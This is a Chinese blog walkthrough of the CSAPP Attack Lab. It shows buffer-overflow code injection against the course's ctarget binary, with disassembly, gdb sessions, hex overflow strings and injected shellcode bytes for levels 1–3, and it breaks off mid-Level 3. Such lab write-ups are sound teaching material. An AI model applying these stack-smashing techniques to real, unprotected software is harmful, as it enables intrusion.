@@ -1,0 +1,909 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  <link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=0.5.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="C/C++,CSAPP,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xzjqx's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/face1.gif?v=0.5.0">
+
+
+
+
+
+
+<meta name="description" content="准备工作深入理解计算机系统（CSAPP）的实验三是Attack Lab。实验分为两个部分，分别对应一种攻击方式：代码注入攻击（Code Injection Attacks）和ROP攻击（）。我们的任务是完成五个这两类攻击。 实验提供了五个文件，其作用如下：  ctarget：用来做代码注入攻击的程序 rtarget: 用来做 ROP 攻击的程序  cookie.txt: 一个 8 位的 16 进制">
+<meta name="keywords" content="C&#x2F;C++,CSAPP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入理解计算机系统（CSAPP）实验三 Attack Lab">
+<meta property="og:url" content="http://xzjqx.data/2018/05/10/attacklab/index.html">
+<meta property="og:site_name" content="xzjqx&#39;s blog">
+<meta property="og:description" content="准备工作深入理解计算机系统（CSAPP）的实验三是Attack Lab。实验分为两个部分，分别对应一种攻击方式：代码注入攻击（Code Injection Attacks）和ROP攻击（）。我们的任务是完成五个这两类攻击。 实验提供了五个文件，其作用如下：  ctarget：用来做代码注入攻击的程序 rtarget: 用来做 ROP 攻击的程序  cookie.txt: 一个 8 位的 16 进制">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-06-12T14:12:50.633Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="深入理解计算机系统（CSAPP）实验三 Attack Lab">
+<meta name="twitter:description" content="准备工作深入理解计算机系统（CSAPP）的实验三是Attack Lab。实验分为两个部分，分别对应一种攻击方式：代码注入攻击（Code Injection Attacks）和ROP攻击（）。我们的任务是完成五个这两类攻击。 实验提供了五个文件，其作用如下：  ctarget：用来做代码注入攻击的程序 rtarget: 用来做 ROP 攻击的程序  cookie.txt: 一个 8 位的 16 进制">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> 深入理解计算机系统（CSAPP）实验三 Attack Lab | xzjqx's blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?30d8ceca14541976d67a61960a178e2b";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">xzjqx's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">个人博客</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th fa-fw"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="#" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                深入理解计算机系统（CSAPP）实验三 Attack Lab
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2018-05-10T16:08:06+08:00" content="2018-05-10">
+              2018-05-10
+            </time>
+          </span>
+
+          <span class="post-count">&nbsp; | &nbsp;字数 8,197</span>
+          <span class="post-count">&nbsp; | &nbsp;阅读预计 47分钟</span>
+          <!--<span class="busuanzi_container_page_pv">&nbsp; | &nbsp;阅读次数<span id="busuanzi_value_page_pv"></span></span>-->
+
+          <!--
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/计算机系统/" itemprop="url" rel="index">
+                    <span itemprop="name">计算机系统</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+          -->
+
+          <!--
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2018/05/10/attacklab/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2018/05/10/attacklab/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+          -->
+
+          
+
+          
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>深入理解计算机系统（CSAPP）的实验三是Attack Lab。实验分为两个部分，分别对应一种攻击方式：代码注入攻击（Code Injection Attacks）和ROP攻击（）。我们的任务是完成五个这两类攻击。</p>
+<p>实验提供了五个文件，其作用如下：</p>
+<ul>
+<li>ctarget：用来做代码注入攻击的程序</li>
+<li>rtarget: 用来做 ROP 攻击的程序 </li>
+<li>cookie.txt: 一个 8 位的 16 进制代码，用来作为攻击的标识符 </li>
+<li>farm.c: 用来找寻 gadget 的源文件 </li>
+<li>hex2raw: 用来生成攻击字符串的程序</li>
+</ul>
+<a id="more"></a>
+<h2 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h2><p>这一部分有三个phase，我们用特定的字符串攻击ctarget程序。 </p>
+<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>Level 1不需要我们注入新的代码，但是需要输入的字符串使程序执行一个已有的代码段（不是正常执行的代码）。ctarget中的test调用一个getbuf函数，用于从控制台输入字符串.</p>
+<p>test函数C代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> val;</div><div class="line">    val = getbuf();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"NO explit. Getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>getbuf的C代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</div><div class="line">    Gets(buf);</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>当getbuf执行完毕时，程序会返回test函数中，但是我们需要改变这个行为，使getbuf函数执行完毕后返回touch1函数：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</div><div class="line">    vlevel = <span class="number">1</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Touch!: You called touch1()\n"</span>);</div><div class="line">    validate(<span class="number">1</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>实验提供了一些建议：</p>
+<ul>
+<li>本关所需要的所有信息都可以在 ctarget 的汇编代码中找到</li>
+<li>具体要做的是把 touch1 的开始地址放到 ret 指令的返回地址中</li>
+<li>注意字节的顺序</li>
+<li>可以用 gdb 在 getbuf 的最后几条指令设置断点，来看程序有没有完成所需的功能</li>
+<li>具体 buf 在栈帧中的位置是由 BUFFER_SIZE 决定的，需要检查汇编代码来查看具体位置</li>
+</ul>
+<p>从上述建议中我们知道，先将ctarget反汇编再查看具体代码就能解决完成这个攻击，具体步骤如下：</p>
+<p>1)  查看getbuf的反汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</div><div class="line">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</div><div class="line">   0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</div><div class="line">   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</div><div class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</div><div class="line">   0x00000000004017bd &lt;+21&gt;:    retq</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
+<p>分析getbuf的C代码和汇编代码可以看出BUFFER_SIZE是rsp移动的位置-0x28，也就是40位。</p>
+<p>2)  查看touch1的反汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function touch1:</div><div class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</div><div class="line">   0x00000000004017c4 &lt;+4&gt;:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</div><div class="line">   0x00000000004017ce &lt;+14&gt;:    mov    $0x4030c5,%edi</div><div class="line">   0x00000000004017d3 &lt;+19&gt;:    callq  0x400cc0 &lt;puts@plt&gt;</div><div class="line">   0x00000000004017d8 &lt;+24&gt;:    mov    $0x1,%edi</div><div class="line">   0x00000000004017dd &lt;+29&gt;:    callq  0x401c8d &lt;validate&gt;</div><div class="line">   0x00000000004017e2 &lt;+34&gt;:    mov    $0x0,%edi</div><div class="line">   0x00000000004017e7 &lt;+39&gt;:    callq  0x400e40 &lt;exit@plt&gt;</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
+<p>touch1的入口地址是0x4017c0。</p>
+<p>3)  设置导致溢出的字符串：</p>
+<p>知道了BUFFER_SIZE的大小和touch1的入口地址，我们可以制造缓冲区溢出攻击，也就是输入一个大小大于40位的字符串，将buf填满的同时，把touch1函数的入口地址覆盖getbuf原有的返回地址，这样getbuf返回时就会执行touch1函数。于是设置字符串如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">c0 17 40 00</div></pre></td></tr></table></figure>
+<p>​    保存到文件phase1.txt中</p>
+<p>4)  将字符串转化为字节码：</p>
+<p>使用hex2raw工具将phase1.txt转化为字节码，保存到文件phase1_input.txt中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hex2ram &lt; phase1.txt &gt; phase1_input.txt</div></pre></td></tr></table></figure>
+<p>5)  再执行ctarget，查看结果：</p>
+<p>使用如下命令测试，同时查看结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">./ctarget -qi phase1_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Touch1!: You called touch1()</div><div class="line">Valid solution for level 1 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">        user id bovik</div><div class="line">        course  15213-f15</div><div class="line">        lab     attacklab</div><div class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00</div></pre></td></tr></table></figure>
+<p>Level 1通过。 </p>
+<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>Level 2需要插入一小段代码。ctarget中有一小段程序touch1，其C代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</div><div class="line">    vlevel = <span class="number">2</span>;  <span class="comment">/* Part of validation protocol */</span></div><div class="line">    <span class="keyword">if</span> (val == cookie)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</div><div class="line">        validate(<span class="number">2</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</div><div class="line">        fail(<span class="number">2</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>我们的任务同样是让ctarget程序执行touch2而不是返回test，但是touch2函数需要传入一个参数，且实验要求这个参数是是我们的Cookie，上一个phase已经知道Cookie：0x59b997fa。实验也提供了一些建议：</p>
+<ul>
+<li>使用ret指令调用touch2函数</li>
+<li>touch2的参数要存在rdi寄存器中</li>
+<li>插入的代码应该设置寄存器存着Cookie，然后再返回touch2</li>
+<li>不用jmp和call指令</li>
+<li>使用gcc和objdump生成要插入代码的字节码格式</li>
+</ul>
+<p>具体步骤如下：</p>
+<p>1)  查看touch2的入口地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function touch2:</div><div class="line">   0x00000000004017ec &lt;+0&gt;:     sub    $0x8,%rsp</div><div class="line">   0x00000000004017f0 &lt;+4&gt;:     mov    %edi,%edx</div></pre></td></tr></table></figure>
+<p>touch2的入口地址位0x4017ec</p>
+<p>2)  需要注入的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov $0x59b997fa,%rdi  # rdi = My Cookie = 0x59b997fa</div><div class="line">pushq $0x4017ec</div><div class="line">ret</div></pre></td></tr></table></figure>
+<p>3)  生成机器码 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -c phase2.s -o phase2.o</div><div class="line">objdump -d phase2.o&gt; phase2.d</div></pre></td></tr></table></figure>
+<p>查看phase2.d如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">phase2.o:     file format elf64-x86-64</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">0000000000000000 &lt;.text&gt;:</div><div class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</div><div class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</div><div class="line">   c:	c3                   	retq</div></pre></td></tr></table></figure>
+<p>可以看出这一段程序的机器码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3</div></pre></td></tr></table></figure>
+<p>4)  生成字节码并注入程序</p>
+<p>注入过程可以类似Level 1，但是这回不是返回touch2的入口地址，而是需要返回我们要注入的这段程序。其实把这段程序当作getbuf输入的字符，输入进getbuf函数的栈帧中，再使用缓冲区溢出的方法，将ret的返回地址设置为缓冲区的入口地址即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">(gdb) disas getbuf</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</div><div class="line">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</div><div class="line">   0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</div><div class="line">   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</div><div class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</div><div class="line">   0x00000000004017bd &lt;+21&gt;:    retq</div><div class="line">End of assembler dump.</div><div class="line">(gdb) break *0x4017b4</div><div class="line">Breakpoint 1 at 0x4017b4: file buf.c, line 16.</div><div class="line">(gdb) run -q</div><div class="line">Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:1111</div><div class="line"></div><div class="line">Breakpoint 1, getbuf () at buf.c:16</div><div class="line">16      buf.c: No such file or directory.</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</div><div class="line">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</div><div class="line">   0x00000000004017af &lt;+7&gt;:     callq  0x401a40 &lt;Gets&gt;</div><div class="line">=&gt; 0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</div><div class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</div><div class="line">   0x00000000004017bd &lt;+21&gt;:    retq</div><div class="line">End of assembler dump.</div><div class="line">(gdb) print $rsp</div><div class="line">$1 = (void *) 0x5561dc78</div></pre></td></tr></table></figure>
+<p>由上可知：缓冲区地址为0x5561dc78，按照Level 1的做法，把这个地址放在第41到44个字节的位置（小端模式），生成输入字符如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 fa </div><div class="line">97 b9 59 68 </div><div class="line">ec 17 40 00 </div><div class="line">c3 00 00 00</div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">78 dc 61 55</div></pre></td></tr></table></figure>
+<p>存入文件phase2.txt中，再使用hex2ram生成字节码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hex2ram &lt; phase2.txt &gt; phase2_input.txt</div></pre></td></tr></table></figure>
+<p>5)  再执行ctarget，查看结果：</p>
+<p>使用如下命令测试，同时查看结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">./ctarget -qi phase2_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Touch2!: You called touch2(0x59b997fa)</div><div class="line">Valid solution for level 2 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">        user id bovik</div><div class="line">        course  15213-f15</div><div class="line">        lab     attacklab</div><div class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55</div></pre></td></tr></table></figure>
+<p>Level 2通过。 </p>
+<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>Level 3类似与Level 2，也是需要插入一段代码，是程序运行touch3，而不是返回test。但是这一关多了一个函数hexmatch，两段C程序代码如下： </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</div><div class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</div><div class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</div><div class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</div><div class="line">    vlevel = <span class="number">3</span>;</div><div class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</div><div class="line">        validate(<span class="number">3</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</div><div class="line">        fail(<span class="number">3</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>同时，不像Level 2，这一关将Cookie的字符串地址作为参数传入touch3函数。首先将Cookie转化为ASCII码形式，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x59b997fa &gt;&gt; 35 39 62 39 39 37 66 61</div></pre></td></tr></table></figure>
+<p>使用Level 2的方式进入touch3，查看hexmatch函数改动的缓冲区数据，将上述ASCII码插入正确的缓冲区即可：</p>
+<p>phase3.s：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mov $0x59b997fa,%rdi  # rdi = My Cookie = 0x59b997fa</div><div class="line"></div><div class="line">pushq $0x4018fa        # touch3的入口地址</div><div class="line"></div><div class="line">ret</div></pre></td></tr></table></figure>
+<p>phase3.txt：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 fa </div><div class="line">97 b9 59 68 </div><div class="line">fa 18 40 00 </div><div class="line">c3 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">00 00 00 00 </div><div class="line">78 dc 61 55</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">./hex2raw &lt; phase3.txt &gt; phase3_input.txt</div><div class="line">gdb ctarget</div><div class="line">(gdb) break touch3</div><div class="line">Breakpoint 1 at 0x4018fa: file visible.c, line 71.</div><div class="line">(gdb) run -qi phase3_input.txt</div><div class="line">Starting program: /home/minimips/Desktop/CMU实验_2018/Attack lab/target1/ctarget -qi phase3_input.txt</div><div class="line">Cookie: 0x59b997fa</div><div class="line"></div><div class="line">Breakpoint 1, touch3 (</div><div class="line">    sval=0x59b997fa &lt;error: Cannot access memory at address 0x59b997fa&gt;)</div><div class="line">    at visible.c:71</div><div class="line">71      visible.c: No such file or directory.</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code for function touch3:</div><div class="line">=&gt; 0x00000000004018fa &lt;+0&gt;:     push   %rbx</div><div class="line">   0x00000000004018fb &lt;+1&gt;:     mov    %rdi,%rbx</div><div class="line">   0x00000000004018fe &lt;+4&gt;:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc 